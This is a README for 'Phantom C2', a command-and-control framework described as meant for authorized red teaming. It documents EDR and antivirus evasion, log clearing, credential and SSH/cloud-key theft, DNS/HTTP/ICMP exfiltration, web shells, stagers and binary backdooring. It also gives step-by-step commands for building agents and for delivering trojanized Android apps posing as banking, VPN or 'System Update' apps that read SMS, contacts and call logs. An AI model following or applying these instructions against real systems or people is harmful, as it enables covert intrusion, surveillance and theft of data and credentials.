# Phantom C2

```
                          ___
                     ____/   \____
                ____/    _   _    \____
           ____/   _____/ \_/ \_____   \____
      ____/  _____/   PHANTOM C2   \_____  \____
     /______/____________________________\______\
            \___        ✦        ___/
                \_______•_______/

     [::] Phantom C2 Framework — Red Team Operations
     [::] Stealth • Precision • Control
```

<p align="center">
  <strong>A modern Command & Control framework for authorized red team engagements</strong><br>
  <em>Inspired by the B-2 Spirit — invisible, precise, and lethal</em>
</p>

<p align="center">
  <a href="#features">Features</a> |
  <a href="#installation">Installation</a> |
  <a href="#usage">Usage</a> |
  <a href="#agent-capabilities">Agent Capabilities</a> |
  <a href="#payload-generation">Payloads</a> |
  <a href="#disclaimer">Disclaimer</a>
</p>

---

## Screenshots

### Dashboard — Agent Overview, Beacon Graph, Network Topology
![Dashboard](docs/screenshots/dash.jpg)

### Agent Management — Status, OS, IP, Interact
![Agents](docs/screenshots/dash1.jpg)

### Listener Management — HTTP/HTTPS, Presets, Create & Start
![Listeners](docs/screenshots/dash2.jpg)

### Terminal — .NET Assembly, Quick Actions, File Upload
![Terminal](docs/screenshots/dash4.jpg)

### Payload Generator — EXE, Stagers, Obfuscation Levels
![Payloads](docs/screenshots/dash5.jpg)

### Binary Backdoor & Persistence Generator
![Backdoor](docs/screenshots/dash6.jpg)

### Mobile App Builder (30+ Templates)
![App Templates](docs/assets/screenshot-app-templates.png)

### Mobile Payload Generation (Android + iOS)
![Mobile Payloads](docs/assets/screenshot-mobile-payloads.png)

### Mobile Agent Callback
![Mobile Callback](docs/assets/screenshot-mobile-callback.png)

### All Commands (35+)
![Help](docs/assets/screenshot-help.png)

### Agent Capabilities
![Agent Help](docs/assets/screenshot-agent-help.png)

### Web UI, Reports & Webhooks
![WebUI](docs/assets/screenshot-webui-report.png)

---

## Features

**Interface**
- **Dual interface** — choose CLI, Web UI, or both on startup
- **Operator authentication** — first-run setup + masked password login
- **Web UI dashboard** — Cobalt Strike/Mythic-inspired with light/dark theme toggle
- **CLI shell** — styled prompt with session recording and real-time event notifications
- **Keyboard shortcuts** — Alt+1-9 tab switching, `/` to focus terminal

**Communications**
- **HTTP/HTTPS/DNS/TCP/SMB listeners** with malleable communication profiles
- **Encrypted comms** — RSA-2048 key exchange + AES-256-GCM with auto key rotation
- **4 malleable profiles** — Default, Microsoft 365, Cloudflare Workers, Redirector
- **SMB/Unix socket pivoting** — agent-to-agent relay for lateral access
- **Mobile endpoint** — `/api/v1/mobile/checkin` for Android/iOS callbacks
- **Listener presets** — save, load, one-click launch from CLI or Web UI
- **JA3 fingerprint randomization** — random cipher suites per connection to avoid TLS fingerprinting
- **User-Agent rotation** — 7 real browser UAs randomly selected per request
- **Traffic padding** — random-length data padding defeats traffic pattern analysis
- **Exponential backoff** — failed connections use 2^n retry to avoid flooding detection

**Evasion & Stealth**
- **AMSI bypass** — patches AmsiScanBuffer
- **ETW bypass** — patches EtwEventWrite
- **ntdll unhooking** — loads clean .text from disk
- **Process hollowing** — CreateProcess suspended + QueueUserAPC
- **Sleep encryption** — Ekko-style memory encryption during sleep (defeats BeaconEye, YARA)
- **Indirect syscalls** — Halo's Gate SSN resolution to bypass EDR hooks
- **Parent PID spoofing** — spawn processes under explorer.exe/svchost.exe
- **Stack spoofing framework** — fake call stack during sleep
- **Timestomping** — modify file timestamps to match reference files
- **Log cleanup** — clear Windows event logs (Security, System, PowerShell) and Linux syslogs
- **Unhook ALL DLLs** — ntdll + kernel32 + kernelbase + advapi32 (not just ntdll)
- **Remove PE headers** — wipe MZ/PE signatures from memory (invisible to scanners)
- **Patch all ETW providers** — EtwEventWrite, EtwEventWriteEx, EtwEventWriteFull, EtwEventWriteTransfer, NtTraceEvent
- **BlockDLLs policy** — spawn processes that block EDR DLL injection (BLOCK_NON_MICROSOFT_BINARIES)
- **Module stomping** — overwrite legitimate DLL .text with implant code
- **Hardware breakpoint hooks** — debug register-based hooking (no code modification)
- **Advanced evasion init** — single command runs all bypass techniques at once
- **Self-cleanup** — removes binary and clears environment on kill/kill-date
- **Sandbox detection** — uptime, CPU, hostname, environment checks
- **Mobile evasion** — anti-emulator, anti-Frida, anti-debug, anti-AV (25+ packages)

**Execution**
- **In-memory BOF** — COFF parser (Windows), memfd_create (Linux), 55+ BOF catalog
- **.NET assembly execution** — in-memory via PowerShell reflection (Seatbelt, Rubeus, SharpHound, Certify, etc.)
- **Shellcode execution** — VirtualAlloc/mmap, zero disk footprint
- **Process injection** — CreateRemoteThread
- **22 AD commands** — enumeration, Kerberoasting, DCSync, lateral movement

**Initial Access**
- **Port scanner** — TCP port scan with service detection
- **Password spray** — SMB-based credential spraying
- **Network discovery** — ping sweep / nmap host discovery
- **SMB enumeration** — share listing and access checks
- **DNS enumeration** — A, MX, NS, TXT, SRV, SOA record queries
- **Web fingerprinting** — header analysis + common path discovery (robots.txt, .git, .env)
- **Vulnerability scan** — basic vuln assessment (open ports, SMB signing, common vulns)

**Post-Exploitation**
- **Token manipulation** — steal, make, revert, impersonate
- **Keylogger** — GetAsyncKeyState (Windows), xinput (Linux)
- **C2-tunneled SOCKS5 proxy** — runs on operator's machine, proxychains-compatible
- **Port forwarding** — forward local ports to remote targets through agents
- **Credential harvesting** — browser, WiFi, clipboard, SSH, RDP, vault
- **12 persistence methods** — registry, schtask, startup folder, WMI event (fileless), Windows service, logon script, COM hijack, cron, systemd, bashrc, profile, rc.local
- **Persistence management** — `persist list` to check installed, `persist remove` to clean all
- **Lateral movement** — wmiexec, winrm, psexec, ssh, pth, wmi-spawn, winrm-spawn
- **55+ BOF catalog** — AD enum, ADCS, credentials, kerberos, evasion, privesc, networking

**Data Exfiltration (12 methods)**
- **DNS exfil** — encode data as DNS subdomain queries (stealthy, bypasses firewalls)
- **HTTP exfil** — POST data to external server (fast)
- **ICMP exfil** — embed data in ping packets (no TCP/UDP required)
- **SMB exfil** — copy to network shares
- **Credential theft** — clipboard, browser passwords, WiFi keys, RDP saved creds, Windows vault
- **Key discovery** — SSH private keys, AWS/Azure/GCP/Kubernetes credentials, .env files
- **Data packaging** — compress directories for efficient exfiltration

**Payload Generation (26+ types)**
- **Agent binaries** — Windows EXE, Linux ELF, garble-obfuscated
- **Web shells** — ASPX, PHP, JSP (token-protected with 404 decoy)
- **Stagers** — PowerShell, Bash, Python, HTA, VBA macro
- **Mobile** — Android APK builder (30+ fake app templates), iOS MDM + phishing
- **Binary backdooring** — inject agent into any PE/ELF binary (like Sliver `backdoor`)
- **DLL sideloading** — proxy DLL for Teams, Slack, Chrome, VSCode, Firefox, PuTTY
- **LNK shortcut backdoor** — malicious shortcuts with real app icons
- **Installer wrapper** — trojanized setup that runs agent + real installer
- **Service DLL** — Windows service under svchost (auto-restart, survives reboot)
- **WMI event subscription** — fileless persistence (no files on disk)
- **Office template macro** — VBA in Normal.dotm (runs on every new document)
- **Registry/scheduled task/startup folder** — multiple persistence generators
- **Obfuscation options** — None, Strip+UPX (60% size reduction), or Garble from Web UI
- **Plugin system** — extensible plugins directory (.py, .sh, .ps1) with auto-discovery
- **Resumable file transfers** — 4MB chunked transfers with SHA-256 checksums
- **API key authentication** — generate keys for scripting/automation (X-API-Key header)

**Web UI (Full Feature Parity with CLI)**
- **Light/dark theme** — toggle with persistence, professional light theme
- **Bigger sidebar icons** — labeled icons for all tabs
- **Dashboard** — real-time stats, beacon graphs, network topology, engagement timer
- **Agent management** — rename agents, delete dead agents, agent cards with status
- **Listener management** — create, start/stop, save presets, one-click launch
- **Interactive terminal** — colored output (IPs cyan, errors red, FLAGs gold), command history, `help` / `?` for full agent command reference (OS-aware)
- **Payload generator** — listener/preset dropdown, obfuscation level, auto-download
- **Backdoor generator** — binary backdoor + 10 persistence types from browser
- **File browser** — OS-adaptive (dir/ls), clickable folders, Up/Refresh navigation
- **Credential manager** — add/view/remove harvested credentials with type tagging
- **Loot viewer** — browse captured output by type (creds, files, screenshots, keylogs)
- **Pivot map** — canvas network graph showing agents grouped by subnet
- **IOC dashboard** — tracks files dropped, network connections, processes, persistence
- **Session replay** — replay any agent's full command history with timestamps
- **Command templates** — 6 built-in templates (Initial Enum, AD Enum, etc.) with one-click Run All
- **MITRE ATT&CK mapping** — 16 technique IDs mapped to Phantom commands
- **Auto-tasks** — configure commands to run automatically on new agent check-in
- **Operator audit log** — who sent what command to which agent
- **Engagement notes** — persistent notepad for documenting findings
- **Browser notifications** — push alerts on new agent check-in
- **Export data** — download full engagement data as JSON
- **SOCKS proxy** — start/stop C2-tunneled SOCKS from the terminal tab
- **Sleep/jitter control** — adjust beacon intervals from the Web UI
- **Multi-operator** — concurrent CLI + Web UI sessions

**Operations**
- **C2-tunneled SOCKS5** — proxychains-compatible pivoting through agents
- **Engagement timer** — elapsed time tracking in topbar
- **Engagement reporting** — Markdown + CSV with full activity timeline
- **Webhook notifications** — Slack/Discord alerts on events
- **Session recording** — every command logged for documentation
- **Built-in diagnostics** — `--doctor` flag checks 25+ system requirements
- **Redirector support** — generate Nginx/Caddy/Cloudflare/iptables configs
- **Docker deployment** — `docker-compose up -d` one-liner

---

## Installation

### Linux (Kali / Ubuntu / Debian)

```bash
# Step 1: Install Go (if not already installed)
sudo apt update
sudo apt install -y golang-go git make

# Verify Go version (1.22+ required)
go version

# Step 2: Clone the repository
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# Step 3: Install dependencies
go mod tidy

# Step 4: (Optional) Install garble for agent obfuscation
go install mvdan.cc/garble@latest

# Step 5: Generate RSA keypair (required for encrypted comms)
go run ./cmd/keygen -out configs/

# Step 6: (Optional) Generate TLS certificates for HTTPS listeners
bash scripts/generate_certs.sh

# Step 7: Build the server
make server

# Step 8: Start Phantom
./build/phantom-server --config configs/server.yaml
```

### Windows

```powershell
# Step 1: Install Go
# Download from https://go.dev/dl/ and run the installer
# Or use winget:
winget install GoLang.Go

# Restart your terminal after installing Go, then verify:
go version

# Step 2: Install Git (if not already installed)
winget install Git.Git

# Step 3: Clone the repository
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom

# Step 4: Install dependencies
go mod tidy

# Step 5: (Optional) Install garble for agent obfuscation
go install mvdan.cc/garble@latest

# Step 6: Generate RSA keypair
go run ./cmd/keygen -out configs/

# Step 7: Build the server
go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server

# Step 8: Start Phantom
.\build\phantom-server.exe --config configs\server.yaml
```

### Quick Install (One-liner)

**Linux:**
```bash
git clone https://github.com/Phantom-C2-77/Phantom.git && cd Phantom && go mod tidy && go run ./cmd/keygen -out configs/ && make server && ./build/phantom-server --config configs/server.yaml
```

**Windows (PowerShell):**
```powershell
git clone https://github.com/Phantom-C2-77/Phantom.git; cd Phantom; go mod tidy; go run ./cmd/keygen -out configs/; go build -ldflags "-s -w" -o build\phantom-server.exe ./cmd/server; .\build\phantom-server.exe --config configs\server.yaml
```

### Docker (Recommended)

```bash
git clone https://github.com/Phantom-C2-77/Phantom.git
cd Phantom
docker-compose up -d
docker attach phantom-c2
```

Exposes: HTTP (8080), HTTPS (443), DNS (53), Web UI (3000)

---

## Usage

### Starting the Server

```bash
./build/phantom-server --config configs/server.yaml
```

You will see:

```
    ___  __  __   ___   _  __ ______ ____   __  ___
   / _ \/ / / /  / _ | / |/ //_  __// __ \ /  |/  /
  / ___/ /_/ /  / __ |/    /  / /  / /_/ // /|_/ /
 /_/   \____/  /_/ |_/_/|_/  /_/   \____//_/  /_/

  [::] Phantom C2 Framework — Red Team Operations
  [::] Version: dev

  [*] Loading configuration from configs/server.yaml
  [*] Initializing server...
  [+] Listener 'fallback-http' started on 0.0.0.0:8080 (http)
  [+] Phantom C2 server ready
  [*] Type 'help' for available commands

  phantom >
```

### Global Commands

```
  phantom > help

  Phantom C2 — Commands
  ─────────────────────────────────────────

  agents                         List all connected agents
  interact <name|id>             Interact with an agent
  listeners [start|stop] <name>  Manage listeners
  tasks [agent]                  View task history
  generate <type> [url]          Build agent or generate payload
  remove <name|id>               Remove a dead agent
  loot [agent]                   View captured loot
  events                         View event log
  clear                          Clear screen
  help                           Show this help
  exit                           Shutdown and exit
```

### Interacting with Agents

```
  phantom > agents
  ┌──────────┬───────────────┬─────────┬──────────┬───────┬─────────────┬──────────┬──────────┬────────┐
  │    ID    │     Name      │   OS    │ Hostname │ User  │     IP      │  Sleep   │ Last Seen│ Status │
  ├──────────┼───────────────┼─────────┼──────────┼───────┼─────────────┼──────────┼──────────┼────────┤
  │ a3f2e8c1 │ silent-falcon │ windows │ DC-PROD  │ admin │ 10.0.1.42   │ 10s/20%  │ 2s ago   │ active │
  │ b7d4f091 │ dark-raven    │ linux   │ web-01   │ root  │ 10.0.1.100  │ 10s/20%  │ 5s ago   │ active │
  └──────────┴───────────────┴─────────┴──────────┴───────┴─────────────┴──────────┴──────────┴────────┘

  phantom > interact silent-falcon
  [+] Interacting with silent-falcon (admin@DC-PROD)

  phantom [silent-falcon] > shell whoami
  [+] Task queued (ID: a3f2e8c1) — waiting for agent check-in...
  [+] Result:
      dc-prod\admin

  phantom [silent-falcon] > ad-help
  (shows all 22 AD commands)

  phantom [silent-falcon] > ad-enum-users
  phantom [silent-falcon] > ad-kerberoast
  phantom [silent-falcon] > screenshot
  phantom [silent-falcon] > persist registry
  phantom [silent-falcon] > back
```

### Agent Commands (inside `interact` session)

| Command | Description |
|---------|-------------|
| `shell <command>` | Execute shell command (cmd.exe / /bin/sh) |
| `upload <local> <remote>` | Upload file to agent |
| `download <remote>` | Download file from agent |
| `screenshot` | Capture screenshot |
| `ps` | List running processes |
| `sysinfo` | Get system information |
| `sleep <sec> [jitter%]` | Change sleep interval |
| `cd <path>` | Change working directory |
| `bof <file> [args]` | Execute Beacon Object File (in-memory) |
| `shellcode <file>` | Execute raw shellcode in-memory |
| `inject <pid> <file>` | Inject shellcode into remote process |
| `ad-*` | Active Directory commands (type `ad-help`) |
| `token <cmd>` | Token manipulation (steal/make/revert/impersonate) |
| `keylog <seconds>` | Start keylogger |
| `creds <target>` | Credential harvesting (browser/wifi/clipboard/ssh) |
| `socks start [port]` | Start C2-tunneled SOCKS5 proxy |
| `portfwd <local> <remote>` | Port forwarding through agent |
| `evasion` | Run evasion (AMSI/ETW/ntdll unhook) |
| `evasion timestomp <f> <r>` | Match file timestamps |
| `evasion clearlogs` | Clear Windows/Linux event logs |
| `persist <method>` | Install persistence (see below) |
| `persist list` | Show installed persistence |
| `persist remove` | Remove all persistence |
| `lateral <method> <args>` | Lateral movement (wmiexec/winrm/psexec/ssh/pth) |
| `pivot <cmd>` | SMB named pipe pivoting |
| `kill` | Terminate the agent |
| `info` | Show agent details |
| `tasks` | Show task history |
| `back` | Return to main menu |

### Persistence Methods

| Method | Platform | Description |
|--------|----------|-------------|
| `registry` | Windows | HKCU Run key (no admin needed) |
| `schtask` | Windows | Scheduled task on logon |
| `startup` | Windows | Copy to Startup folder |
| `wmi` | Windows | WMI event subscription (fileless) |
| `winservice` | Windows | Windows service as SYSTEM |
| `logonscript` | Windows | UserInitMprLogonScript (before Explorer) |
| `comhijack` | Windows | COM object hijack (loads with Explorer) |
| `cron` | Linux | Cron job every 5 minutes |
| `service` | Linux | Systemd user service (auto-restart) |
| `bashrc` | Linux | .bashrc backdoor |
| `profile` | Linux | .profile backdoor (login shells) |
| `rc.local` | Linux | /etc/rc.local boot script (root required) |

### Lateral Movement

```
lateral wmiexec <target> <user> <pass> <command>
lateral winrm <target> <user> <pass> <command>
lateral psexec <target> <user> <pass> <command>
lateral ssh <target> <user> <pass> <command>
lateral pth <target> <user> <ntlm_hash> <command>
lateral wmi-spawn <target> <user> <pass> <stager_url>
lateral winrm-spawn <target> <user> <pass> <stager_url>
```

---

## Agent Capabilities

| Capability | Windows | Linux |
|-----------|---------|-------|
| Shell Execution | cmd.exe | /bin/sh |
| File Upload/Download | Yes (resumable chunks) | Yes (resumable chunks) |
| Screenshot | PowerShell GDI | import/scrot/xwd |
| Process List | tasklist | ps aux |
| System Info | Full | Full |
| Persistence | 7 methods (registry, schtask, startup, WMI, service, logon, COM) | 5 methods (cron, systemd, bashrc, profile, rc.local) |
| BOF Execution | In-memory COFF loader (55+ catalog) | memfd_create |
| .NET Assembly | In-memory via reflection | N/A |
| Shellcode Execution | VirtualAlloc + CreateThread | mmap RWX |
| Process Injection | CreateRemoteThread | N/A |
| Sandbox Detection | Yes | Yes |
| Lateral Movement | wmiexec, winrm, psexec, pth | ssh |
| Exfiltration | DNS, HTTP, ICMP, SMB, clipboard, browser, WiFi, vault | DNS, HTTP, ICMP, ssh-keys, cloud-keys |
| Initial Access | portscan, spray, enum-smb, enum-web, vuln-scan | portscan, enum-dns, netdiscover |

### Active Directory Commands (22 total)

**Enumeration:** `ad-enum-domain`, `ad-enum-users`, `ad-enum-groups`, `ad-enum-computers`, `ad-enum-shares`, `ad-enum-spns`, `ad-enum-gpo`, `ad-enum-trusts`, `ad-enum-admins`, `ad-enum-asrep`, `ad-enum-delegation`, `ad-enum-laps`

**Attacks:** `ad-kerberoast`, `ad-asreproast`, `ad-dcsync`

**Credential Access:** `ad-dump-sam`, `ad-dump-lsa`, `ad-dump-tickets`

**Lateral Movement:** `ad-psexec`, `ad-wmi`, `ad-winrm`, `ad-pass-the-hash`

### Exfiltration Commands

```
exfil dns <file> <domain>        DNS subdomain tunneling (stealthy)
exfil http <file> <url>          HTTP POST exfil (fast)
exfil icmp <file> <target>       ICMP ping data embed (no TCP/UDP)
exfil smb <file> <share>         SMB file copy
exfil clipboard                  Steal clipboard
exfil browser                    Chrome/Firefox credential databases
exfil wifi                       Saved WiFi passwords
exfil rdp                        Saved RDP credentials
exfil vault                      Windows Credential Vault
exfil ssh-keys                   Find SSH private keys
exfil cloud-keys                 AWS/Azure/GCP/K8s credentials
exfil compress <dir> <output>    Compress directory for exfil
```

### .NET Assembly Execution

```
assembly Seatbelt.exe -group=all
assembly Rubeus.exe kerberoast
assembly SharpHound.exe -c All -d domain.local
assembly Certify.exe find /vulnerable
assembly inline <base64_data> [args]
assembly list
```

### Initial Access

```
initaccess portscan <target> <ports>       TCP port scanner
initaccess spray <target> <users> <pass>   Password spray
initaccess enum-smb <target>               SMB share enumeration
initaccess enum-dns <domain> <ns>          DNS record enumeration
initaccess enum-web <url>                  Web fingerprinting
initaccess vuln-scan <target>              Vulnerability assessment
initaccess netdiscover <cidr>              Host discovery
```

---

## Building Agents

### From the Phantom CLI

```
phantom > generate exe https://your-c2.com:443
[*] Building windows/amd64 agent...
[+] Agent built successfully!
  Output:      build/agents/phantom-agent_windows_amd64.exe
  Size:        6.4 MB
  Platform:    windows/amd64
  Listener:    https://your-c2.com:443
  Sleep:       10s / 20%
```

### From Make

```bash
# Windows agent
make agent-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Linux agent
make agent-linux LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20

# Obfuscated (garble)
make agent-garble-windows LISTENER_URL=https://your-c2.com:443 SLEEP=10 JITTER=20
```

### Make Targets Reference

```bash
make help                # Show all available targets
make server              # Build the server binary
make run                 # Build + start the server
make restart             # Kill running server, rebuild, and start fresh
make agent-windows       # Cross-compile Windows/amd64 agent
make agent-linux         # Cross-compile Linux/amd64 agent
make agent-garble-windows # Obfuscated Windows agent via garble
make agent-all           # Build all agent variants
make keygen              # Generate RSA keypair for server
make certs               # Generate self-signed TLS certificates
make deps                # Install dependencies (Go modules + garble)
make test                # Run all tests
make clean               # Remove all build artifacts
```

**Common workflow after code changes:**
```bash
# Restart the server with latest changes
make restart

# If you changed implant/agent code, rebuild the agent too
make agent-windows LISTENER_URL=http://YOUR-IP:8080
```

### Building Agents with Embedded RSA Key

For agents to communicate with the C2, the server's RSA public key must be embedded:

```bash
cd ~/phantom
SERVER_PUB_DER_B64=$(python3 -c "
import base64, re
with open('configs/server.pub','rb') as f: pem = f.read()
b64 = re.sub(r'-----[^-]+-----', '', pem.decode()).replace('\n','').strip()
print(base64.b64encode(base64.b64decode(b64)).decode())")

GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -ldflags "-s -w \
  -X 'github.com/phantom-c2/phantom/internal/implant.ListenerURL=http://YOUR-IP:8080' \
  -X 'github.com/phantom-c2/phantom/internal/implant.SleepSeconds=5' \
  -X 'github.com/phantom-c2/phantom/internal/implant.JitterPercent=10' \
  -X 'github.com/phantom-c2/phantom/internal/implant.ServerPubKey=$SERVER_PUB_DER_B64'" \
  -o build/agents/phantom-agent_linux_amd64 ./cmd/agent
```

---

## C2-Tunneled SOCKS5 Proxy

Route traffic through compromised agents into internal networks using proxychains:

```bash
# From Phantom CLI
phantom > interact <agent>
phantom [agent] > socks start 1080

# Or from the Web UI: Terminal tab → "SOCKS Proxy" button

# Configure proxychains
echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf

# Scan internal networks through the agent
proxychains nmap -sT -Pn 10.10.20.0/24

# SSH to internal hosts
proxychains ssh admin@10.10.20.10

# Access internal web apps
proxychains curl http://10.10.20.30:8080
```

---

## Shellcode Loader & Staged Delivery

Generate tiny loaders (~30KB) that download and execute the agent entirely in-memory — nothing touches disk:

```bash
# From API:
curl -X POST http://localhost:3000/api/payload/loader \
  -H "Content-Type: application/json" \
  -d '{"listener_url":"http://YOUR-IP:8080","loader_type":"syscall"}'
```

| Loader Type | Size | Description |
|------------|------|-------------|
| `syscall` | ~30KB | Direct API loader with anti-sandbox (most stealthy) |
| `dll` | ~25KB | DLL sideload — rename to version.dll, place with Teams/Slack/Chrome |
| `hollowing` | ~35KB | Process hollowing — injects into suspended svchost.exe |
| `fiber` | ~28KB | Windows Fiber execution — avoids thread-based detection |

**How it works:** C2 encrypts agent with AES-256 → tiny loader downloads encrypted blob → decrypts in-memory → executes. Agent never touches disk, EDR can't scan it.

---

## Binary Backdooring

Inject the Phantom agent into any legitimate executable:

```bash
# From CLI
phantom > backdoor /path/to/putty.exe http://YOUR-C2:8080

# From Web UI: Payloads tab → Binary Backdoor panel

# From API
curl -X POST http://localhost:3000/api/payload/backdoor/binary \
  -H "Content-Type: application/json" \
  -d '{"input":"/path/to/app.exe","listener_url":"http://YOUR-C2:8080"}'
```

Supported backdoor types: DLL sideloading, LNK shortcuts, installer wrappers, service DLLs, registry persistence, scheduled tasks, WMI events (fileless), Office templates, startup folder, Linux bashrc.

---

## Payload Generation

### From the Phantom CLI

```
phantom > generate aspx https://your-c2.com:443
[+] Payload generated: build/payloads/update.aspx
[*] Upload to target web server, then access with:
  curl -X POST -H 'X-Debug-Token: <token>' -d 'data=whoami' <url>

phantom > generate php https://your-c2.com:443
phantom > generate jsp https://your-c2.com:443
phantom > generate powershell https://your-c2.com:443
phantom > generate bash https://your-c2.com:443
phantom > generate python https://your-c2.com:443
phantom > generate hta https://your-c2.com:443
phantom > generate vba https://your-c2.com:443
```

| Payload | Platform | Description |
|---------|----------|-------------|
| `aspx` | IIS/ASP.NET | Token-protected web shell with 404 decoy |
| `php` | Apache/Nginx | Multi-fallback execution (5 methods) |
| `jsp` | Tomcat/Java | Cross-platform web shell |
| `powershell` | Windows | Download & execute stager |
| `bash` | Linux | curl/wget stager |
| `python` | Cross-platform | SSL-capable stager |
| `hta` | Windows | Phishing payload (base64 PS cradle) |
| `vba` | Windows | Office macro (AutoOpen) |

---

## Mobile Payloads (Android + iOS)

### Quick Start — Standalone APK Builder (No Gradle / No Android Studio Project)

The fastest path to a working Android C2 agent. Uses raw SDK tools (`aapt`, `d8`, `apksigner`) — no Gradle project, no Android Studio build chain. Requires only the Android SDK and a JDK.

```bash
# Step 1: Edit the C2 callback URL in the build script
#   Open payloads/android/build_apk.sh and set:
#   C2_URL="http://YOUR-C2-IP:8080"

# Step 2: Build the APK (on any host with Android SDK installed)
bash payloads/android/build_apk.sh

# Step 3: Install on target device
adb install /tmp/phantom.apk

# Step 4: Launch (app hides immediately — foreground service starts)
adb shell am start -n com.android.systemupdate/.MainActivity

# Step 5: Verify in Phantom Web UI or CLI
#   The agent registers via /api/v1/mobile/register
#   and checks in every 10s via /api/v1/mobile/checkin

# Step 6: Send commands from the Web UI (http://localhost:3000)
#   Or from the command line:
python3 phantom_cli.py <agent-name> shell "whoami"
python3 phantom_cli.py <agent-name> shell "id"
python3 phantom_cli.py <agent-name> shell "ls /sdcard/"
python3 phantom_cli.py <agent-name> shell "content query --uri content://sms"
python3 phantom_cli.py <agent-name> shell "content query --uri content://contacts/phones"
```

**What the APK does:**
- Disguised as "System Update" with invisible launcher (Theme.NoDisplay)
- Foreground service with notification — survives Android 8+ background execution limits
- Boot persistence via BroadcastReceiver
- Permissions: Internet, Location, Camera, Mic, Contacts, SMS, Call Log, Storage, Phone State
- Calls back to Phantom's mobile REST API (`/api/v1/mobile/register` + `/api/v1/mobile/checkin`)
- Executes shell commands from C2 and returns output

**Requirements:**
- Android SDK with build-tools (aapt, d8, apksigner)
- Java JDK 8+ (javac)
- Target device: Android 5+ (API 21+), x86_64 for emulators

> **Full exploitation guide** with network setup, deployment steps, protocol details, and
> post-exploitation commands: see [`docs/mobile-exploitation-guide.html`](docs/mobile-exploitation-guide.html)
> (render to PDF with `weasyprint docs/mobile-exploitation-guide.html guide.pdf`)

### Quick Start — Via Phantom CLI (App Templates)

```bash
# Generate a fake VPN app with full UI
phantom > generate app vpn-shield https://YOUR-C2-IP:8080

# Build the APK
cd build/payloads/apps/vpn_shield
# Open in Android Studio → Build → Build APK
# Or: gradle assembleRelease

# Deliver to target
# - Send APK via email/message
# - Host on fake app store page
# - QR code linking to download

# When target installs and opens the app
# - They see a legitimate VPN interface
# - Background service starts C2 callback
# - Agent appears in Phantom: "phantom > agents"

# Interact with mobile agent
phantom > interact toxic-cobra
phantom [toxic-cobra] > shell id
phantom [toxic-cobra] > sysinfo
phantom [toxic-cobra] > shell cat /proc/version
```

### Available App Templates (30+)

| Category | Templates |
|----------|-----------|
| Productivity | Calculator, QR Scanner, PDF Viewer, Notes, File Manager |
| Utility | Flashlight, WiFi Analyzer, Battery Saver, Cleaner, Speed Test |
| Security | VPN Shield, Password Manager, Authenticator, Antivirus Pro |
| Finance | Crypto Wallet, Banking App, Expense Tracker |
| Social | Chat Messenger, Video Call, Dating Connect |
| Entertainment | Music Player, Live TV, Game Hub |
| Corporate | Company Portal, HR Self-Service, IT Support |

### What Each App Includes

- **Realistic UI** — category-specific interface (banking dashboard, security shield, etc.)
- **Background C2 service** — survives app close, runs silently
- **Boot persistence** — auto-starts when device reboots
- **Remote shell** — execute commands on the device
- **Device info** — model, OS, manufacturer, device ID
- **Evasion suite** — anti-emulator, anti-debug, anti-Frida, anti-AV, sandbox timing delay

### Other Mobile Payloads

```bash
# Android-specific payloads (stagers + phishing)
phantom > generate android https://YOUR-C2-IP:8080

# iOS-specific payloads (MDM profile + Apple ID phishing)
phantom > generate ios https://YOUR-C2-IP:8080
```

### Mobile Evasion (Auto-Included)

All generated apps automatically include evasion that:
- Detects emulators (Genymotion, Nox, BlueStacks, QEMU)
- Detects security apps (25+ AV/MDM packages)
- Detects Frida instrumentation (3 detection methods)
- Detects debuggers and analysis tools
- Delays C2 callback 60-120s to outlast sandbox analysis
- Stays fully dormant if any analysis is detected

### Mobile Post-Exploitation Commands

Once the agent is registered, send these via the Web UI or CLI:

| Command | Purpose |
|---------|---------|
| `whoami` | Current user (e.g. `u0_a152`) |
| `id` | Full identity + groups (inet, everybody, cache) |
| `getprop ro.product.model` | Device model |
| `getprop ro.build.version.release` | Android version |
| `settings get secure android_id` | Unique device ID |
| `pm list packages -3` | Third-party installed apps |
| `content query --uri content://sms` | Read SMS messages |
| `content query --uri content://call_log/calls` | Call history |
| `content query --uri content://contacts/phones` | Contact list |
| `dumpsys wifi` | Saved WiFi networks |
| `dumpsys account` | Google accounts on device |
| `dumpsys telephony.registry` | Cell tower info / location |
| `dumpsys battery` | Battery state |
| `ls /sdcard/DCIM/Camera/` | List photos |
| `ls /sdcard/Download/` | List downloads |
| `cat /proc/net/arp` | ARP table (nearby devices) |
| `netstat -tlnp` | Open ports / listening services |

### Mobile C2 REST API

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/v1/mobile/register` | POST | First-time agent registration (JSON) |
| `/api/v1/mobile/checkin` | POST | Periodic check-in — receives tasks, returns results |
| `/api/v1/creds` | POST | Credential harvesting receiver (from phishing pages) |

---

## Configuration

### Server Config (configs/server.yaml)

```yaml
server:
  database: "data/phantom.db"
  rsa_private_key: "configs/server.key"
  rsa_public_key: "configs/server.pub"
  default_sleep: 10
  default_jitter: 20

listeners:
  - name: "default-https"
    type: "https"
    bind: "0.0.0.0:443"
    profile: "default"
    tls_cert: "configs/server.crt"
    tls_key: "configs/server-tls.key"

  - name: "fallback-http"
    type: "http"
    bind: "0.0.0.0:8080"
    profile: "default"
```

### Malleable Profiles

Three built-in profiles in `configs/profiles/`:

- **default.yaml** — Generic API traffic (`/api/v1/status`)
- **microsoft.yaml** — Microsoft 365/Azure (`/common/oauth2/v2.0/token`)
- **cloudflare.yaml** — Cloudflare Workers (`/cdn-cgi/rum`)

---

## Web UI

Start the browser dashboard alongside the CLI:

```
phantom > webui
[+] Web UI started: http://127.0.0.1:3000
```

### Web UI Login

The Web UI requires authentication. Default credentials:

```
Username: admin
Password: phantom
```

All pages and API endpoints are protected — no anonymous access.

### Web UI Features

- **Dashboard** — real-time stats, beacon graphs, network topology, engagement timer
- **Agents** — card view + table view, rename agents, delete dead agents
- **Listeners** — create, start/stop, save presets, one-click launch
- **Tasks** — full task history with output across all agents
- **Terminal** — colored output, command history, quick-action buttons, SOCKS proxy, sleep control
- **Payloads** — generator with listener preset selector, obfuscation options, auto-download
- **Backdoors** — binary backdoor + 10 persistence types (DLL sideload, WMI, registry, etc.)
